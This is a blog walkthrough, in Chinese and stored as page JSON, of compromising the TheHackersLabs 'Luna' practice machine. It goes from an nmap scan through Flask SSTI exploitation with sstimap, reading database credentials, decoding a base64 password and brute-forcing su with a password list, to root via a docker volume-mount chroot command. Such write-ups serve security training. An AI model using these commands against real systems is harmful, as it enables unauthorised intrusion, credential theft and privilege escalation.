{"pageProps":{"postData":{"id":"TheHackersLabsLuna","contentHtml":"<h1>Luna</h1>\n<blockquote>\n<p><a href=\"https://labs.thehackerslabs.com/machine/53\">https://labs.thehackerslabs.com/machine/53</a></p>\n</blockquote>\n<p><img src=\"/post-images/TheHackersLabsLuna/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<p>现在不知道为什么我的 nmap 总是会扫出来 25 和 110 端口</p>\n<pre><code class=\"hljs language-python\">➜  Luna nmap -sT -<span class=\"hljs-built_in\">min</span>-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.133</span>\nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">10</span>-<span class=\"hljs-number\">28</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">49</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.133</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00085</span>s latency).\nNot shown: <span class=\"hljs-number\">65531</span> filtered tcp ports (no-response)\nPORT     STATE SERVICE\n<span class=\"hljs-number\">25</span>/tcp   <span class=\"hljs-built_in\">open</span>  smtp\n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http\n<span class=\"hljs-number\">110</span>/tcp  <span class=\"hljs-built_in\">open</span>  pop3\n<span class=\"hljs-number\">5000</span>/tcp <span class=\"hljs-built_in\">open</span>  upnp\n\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">39.52</span> seconds\n</code></pre>\n<pre><code class=\"hljs language-python\">➜  Luna nmap -sT -A -p <span class=\"hljs-number\">25</span>,<span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">110</span>,<span class=\"hljs-number\">5000</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.133</span>\nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">10</span>-<span class=\"hljs-number\">28</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">50</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.133</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00054</span>s latency).\n\nPORT     STATE SERVICE    VERSION\n<span class=\"hljs-number\">25</span>/tcp   <span class=\"hljs-built_in\">open</span>  tcpwrapped\n|_smtp-commands: Couldn<span class=\"hljs-string\">'t establish connection on port 25\n80/tcp   open  http       Apache httpd 2.4.58\n|_http-title: 403 Forbidden\n|_http-server-header: Apache/2.4.58 (Ubuntu)\n110/tcp  open  tcpwrapped\n5000/tcp open  http       Werkzeug httpd 3.0.3 (Python 3.12.3)\n|_http-server-header: Werkzeug/3.0.3 Python/3.12.3\n|_http-title: RodGar\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: WAP|general purpose\nRunning: Actiontec embedded, Linux 2.4.X\nOS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel cpe:/o:linux:linux_kernel:2.4.37\nOS details: Actiontec MI424WR-GEN3I WAP, DD-WRT v24-sp2 (Linux 2.4.37)\nNetwork Distance: 2 hops\nService Info: Host: 192.168.56.133\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT     ADDRESS\n1   0.33 ms 192.168.111.2\n2   0.43 ms 192.168.56.133\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 53.33 seconds\n</span></code></pre>\n<h3>枚举</h3>\n<p>80 端口</p>\n<p><img src=\"/post-images/TheHackersLabsLuna/image1.png\" alt=\"image.png\"></p>\n<p>5000 端口</p>\n<p><img src=\"/post-images/TheHackersLabsLuna/image2.png\" alt=\"image.png\"></p>\n<h2>SSTI</h2>\n<p>点击 <code>Greet me</code> 报错了，并且能知道调试已经开了</p>\n<p><img src=\"/post-images/TheHackersLabsLuna/image3.png\" alt=\"image.png\"></p>\n<table>\n<thead>\n<tr>\n<th><strong>信息类型</strong></th>\n<th><strong>详细信息</strong></th>\n<th><strong>意义</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>框架/语言</strong></td>\n<td>Python 3.12, Flask, Werkzeug</td>\n<td>目标是一个标准的 Python Web 应用。</td>\n</tr>\n<tr>\n<td><strong>文件路径</strong></td>\n<td><code>/var/www/RODGAR/venv/lib/python3.12/...</code></td>\n<td>泄露了应用程序的部署路径。<code>RODGAR</code> 可能是项目名称、用户名或服务名。</td>\n</tr>\n<tr>\n<td><strong>主要应用文件</strong></td>\n<td><code>/var/www/RODGAR/app.py</code></td>\n<td>确定了主应用文件的位置和名称。</td>\n</tr>\n<tr>\n<td><strong>调试模式</strong></td>\n<td>调试器显示 (Traceback)</td>\n<td>服务器处于调试模式（通常生产环境不会开启），这提供了代码执行细节。</td>\n</tr>\n<tr>\n<td><strong>错误类型</strong></td>\n<td><code>werkzeug.exceptions.BadRequestKeyError: 400 Bad Request</code></td>\n<td>客户端发送了错误的请求，服务器无法找到所需的键。</td>\n</tr>\n<tr>\n<td><strong>缺失的键</strong></td>\n<td><code>KeyError: 'name'</code></td>\n<td>应用程序在处理请求时，期望找到名为 <code>name</code> 的参数，但未能找到。</td>\n</tr>\n</tbody>\n</table>\n<p>从上面的信息能知道我们缺少 <code>name</code> 参数，并且将错误展开后会看到上下文代码，从中发现下面这段代码存在 <code>SSTI</code></p>\n<pre><code class=\"hljs language-python\">name = request.form[<span class=\"hljs-string\">'name'</span>]\ntemplate = <span class=\"hljs-string\">f'''\n&#x3C;DOCTYPE html>\n<span class=\"hljs-meta\">... </span>(HTML content)\n'''</span>\n</code></pre>\n<p>测试 <code>SSTI</code></p>\n<p><img src=\"/post-images/TheHackersLabsLuna/image4.png\" alt=\"image.png\"></p>\n<p>存在 SSTI 我们直接上 <code>sstimap</code></p>\n<pre><code class=\"hljs language-python\">python sstimap.py -u <span class=\"hljs-string\">'http://192.168.56.133:5000/greet'</span> -m POST -d <span class=\"hljs-string\">'name=*'</span>\n</code></pre>\n<p><img src=\"/post-images/TheHackersLabsLuna/image5.png\" alt=\"image.png\"></p>\n<p>我们指定 <code>--os-shell</code> 即可拿到 shell</p>\n<p><img src=\"/post-images/TheHackersLabsLuna/image6.png\" alt=\"image.png\"></p>\n<p>然后进行反弹 <code>shell</code> 即可</p>\n<p><img src=\"/post-images/TheHackersLabsLuna/image7.png\" alt=\"image.png\"></p>\n<h2>横向移动</h2>\n<h3>To juan</h3>\n<p>当前目录下存在 <code>config.php</code> ，却明明是 python 应用</p>\n<pre><code class=\"hljs language-python\">www-data@TheHackersLabs-Luna:~/RODGAR$ cat config.php\ncat config.php\n&#x3C;?php\n$servername = <span class=\"hljs-string\">\"localhost\"</span>;\n$username = <span class=\"hljs-string\">\"admin\"</span>;\n$password = <span class=\"hljs-string\">\"sporting\"</span>;\n$dbname = <span class=\"hljs-string\">\"rodgar\"</span>;\n\n// Crear conexión\n$conn = new mysqli($servername, $username, $password, $dbname);\n\n// Verificar conexión\n<span class=\"hljs-keyword\">if</span> ($conn->connect_error) {\n    die(<span class=\"hljs-string\">\"Conexión fallida: \"</span> . $conn->connect_error);\n}\n?>\n</code></pre>\n<p>成功登录进去</p>\n<pre><code class=\"hljs language-python\">www-data@TheHackersLabs-Luna:~/RODGAR$ mysql -u admin -p\nmysql -u admin -p\nEnter password: sporting\n\nWelcome to the MySQL monitor.  Commands end <span class=\"hljs-keyword\">with</span> ; <span class=\"hljs-keyword\">or</span> \\g.\nYour MySQL connection <span class=\"hljs-built_in\">id</span> <span class=\"hljs-keyword\">is</span> <span class=\"hljs-number\">9</span>\nServer version: <span class=\"hljs-number\">8.0</span><span class=\"hljs-number\">.39</span>-0ubuntu0<span class=\"hljs-number\">.24</span><span class=\"hljs-number\">.04</span><span class=\"hljs-number\">.1</span> (Ubuntu)\n\nCopyright (c) <span class=\"hljs-number\">2000</span>, <span class=\"hljs-number\">2024</span>, Oracle <span class=\"hljs-keyword\">and</span>/<span class=\"hljs-keyword\">or</span> its affiliates.\n\nOracle <span class=\"hljs-keyword\">is</span> a registered trademark of Oracle Corporation <span class=\"hljs-keyword\">and</span>/<span class=\"hljs-keyword\">or</span> its\naffiliates. Other names may be trademarks of their respective\nowners.\n\n<span class=\"hljs-type\">Type</span> <span class=\"hljs-string\">'help;'</span> <span class=\"hljs-keyword\">or</span> <span class=\"hljs-string\">'\\h'</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">help</span>. <span class=\"hljs-type\">Type</span> <span class=\"hljs-string\">'\\c'</span> to clear the current <span class=\"hljs-built_in\">input</span> statement.\n\nmysql>\n</code></pre>\n<p>存在 <code>juan</code> 用户的凭据，还有加密密码</p>\n<pre><code class=\"hljs language-python\">mysql> select * <span class=\"hljs-keyword\">from</span> user;\nselect * <span class=\"hljs-keyword\">from</span> user;\n+-------+----------------------------------+\n| users | password                         |\n+-------+----------------------------------+\n| juan  | YzBvW1VrbU0yTVRSVGU4QGpOLk0oOWIK |\n+-------+----------------------------------+\n<span class=\"hljs-number\">1</span> row <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">set</span> (<span class=\"hljs-number\">0</span>,01 sec)\n</code></pre>\n<p>看着像是 base64 而不是 md5，通过 base64 能解密出来</p>\n<pre><code class=\"hljs language-python\">c0o[UkmM2MTRTe8@jN.M(9b\n</code></pre>\n<p><img src=\"/post-images/TheHackersLabsLuna/image8.png\" alt=\"image.png\"></p>\n<p><code>juan</code> 用户能读取 user.txt</p>\n<pre><code class=\"hljs language-python\">juan@TheHackersLabs-Luna:~$ cat user.txt\ncat user.txt\na81xxxxxxxxxxxxxxxxxxxxxxxxxx0\n</code></pre>\n<h3>To jose</h3>\n<p>juan 家目录下还存在 <code>password.txt</code></p>\n<pre><code class=\"hljs language-python\">juan@TheHackersLabs-Luna:~$ cat pas\ncat password.txt \nTr0ub4dor&#x26;<span class=\"hljs-number\">3</span>\nM0nkey!<span class=\"hljs-number\">2024</span>\nL3tMeIn@<span class=\"hljs-number\">2024</span>\nS3cur3P@ssw0rd\nP@ssw0rd1234\nG00dP@ssw0rd!\nR3liable<span class=\"hljs-comment\">#2024</span>\nW1nter$<span class=\"hljs-number\">2024</span>\nH@ppyD@y<span class=\"hljs-comment\">#1</span>\n4U&#x26;Me2Day!\nB3stS3cur!ty\nF1rst&#x26;Last@<span class=\"hljs-number\">2024</span>\n</code></pre>\n<p>再看家目录下有几个用户，还有 <code>carmen</code>、<code>jose</code>、<code>john</code></p>\n<pre><code class=\"hljs language-python\">juan@TheHackersLabs-Luna:~$ ls /home\ncarmen  john  jose  juan\n</code></pre>\n<p>通过 <code>suForce</code> 来进行爆破</p>\n<p>得到用户 <code>jose</code> 的密码 <code>W1nter$2024</code></p>\n<p><img src=\"/post-images/TheHackersLabsLuna/image9.png\" alt=\"image.png\"></p>\n<h3>To root</h3>\n<p>拥有 docker 权限</p>\n<pre><code class=\"hljs language-python\">jose@TheHackersLabs-Luna:~$ <span class=\"hljs-built_in\">id</span>\n<span class=\"hljs-built_in\">id</span>\nuid=<span class=\"hljs-number\">1002</span>(jose) gid=<span class=\"hljs-number\">1002</span>(jose) groups=<span class=\"hljs-number\">1002</span>(jose),<span class=\"hljs-number\">111</span>(docker)\n</code></pre>\n<p>结束了，这里需要有网络获取镜像才行</p>\n<pre><code class=\"hljs language-python\">sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n</code></pre>","title":"TheHackersLabs - Luna","date":"2025-10-28","updated":"2025-10-28","tags":["TheHackersLabs","Linux","SSTI","Brute","Docker"],"categories":"靶机","comments":true,"description":"Luna https://labs.thehackerslabs.com/machine/53 Recon PortScan 现在不知道为什么我的 nmap 总是会扫出来 25 和 110 端口 枚举 80 端口 5000 端口 SSTI 点击 Greet me 报错了，并且能知道调试已经开了 |..."}},"__N_SSG":true}